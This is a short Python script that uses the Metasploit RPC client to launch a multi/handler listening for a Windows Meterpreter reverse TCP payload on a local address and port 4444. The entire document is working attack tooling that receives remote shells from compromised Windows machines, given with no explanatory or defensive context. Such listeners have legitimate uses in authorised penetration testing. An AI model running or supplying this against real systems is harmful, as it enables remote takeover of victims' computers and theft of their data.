from metasploit.msfrpc import MsfRpcClient

client = MsfRpcClient('password', ssl=True)

exploit = client.modules.use('exploit', 'multi/handler')
exploit['payload'] = 'windows/meterpreter/reverse_tcp'
exploit['LHOST'] = '192.168.1.41'
exploit['LPORT'] = 4444

exploit.execute()